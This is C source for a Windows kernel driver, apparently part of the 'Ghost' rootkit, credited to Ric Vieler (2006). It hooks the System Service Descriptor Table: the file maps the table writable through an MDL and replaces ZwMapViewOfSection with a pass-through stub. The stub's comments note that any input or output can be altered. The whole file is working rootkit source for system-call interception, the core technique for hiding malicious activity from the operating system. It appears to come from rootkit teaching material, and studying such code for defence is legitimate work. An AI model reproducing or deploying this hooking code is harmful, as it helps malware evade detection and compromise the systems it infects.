// hookManager
// Copyright Ric Vieler, 2006
// Hook the System Call Table

#include "ntddk.h"
#include "Ghost.h"
#include "hookManager.h"

NTSTATUS NewZwMapViewOfSection(
    IN HANDLE SectionHandle,
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN ULONG ZeroBits,
    IN ULONG CommitSize,
    IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
    IN OUT PSIZE_T ViewSize,
    IN SECTION_INHERIT InheritDisposition,
    IN ULONG AllocationType,
    IN ULONG Protect )
{
	NTSTATUS status;

	DbgPrint("comint32: NewZwMapViewOfSection called.");
	// we can do whatever we want with the input here
	// and return or continue to the original function

	status = OldZwMapViewOfSection(	SectionHandle,
					ProcessHandle,
					BaseAddress,
					ZeroBits,
					CommitSize,
					SectionOffset OPTIONAL,
					ViewSize,
					InheritDisposition,
					AllocationType,
					Protect );

	// we can do whatever we want with the output here
	// and return any value including the actual one

	return status;
}

NTSTATUS Hook( )
{
	pMyMDL = MmCreateMdl(	NULL,
					KeServiceDescriptorTable.ServiceTableBase,
					KeServiceDescriptorTable.NumberOfServices * 4 );

	if( !pMyMDL )
		return( STATUS_UNSUCCESSFUL );

	MmBuildMdlForNonPagedPool( pMyMDL );
	pMyMDL->MdlFlags = pMyMDL->MdlFlags | MDL_MAPPED_TO_SYSTEM_VA;
	NewSystemCallTable = MmMapLockedPages( pMyMDL, KernelMode );

	if( !NewSystemCallTable )
		return( STATUS_UNSUCCESSFUL );
	
	// Add hooks here (remember to unhook if using DriverUnload)

	HOOK( ZwMapViewOfSection, NewZwMapViewOfSection, OldZwMapViewOfSection );

	return( STATUS_SUCCESS );
}
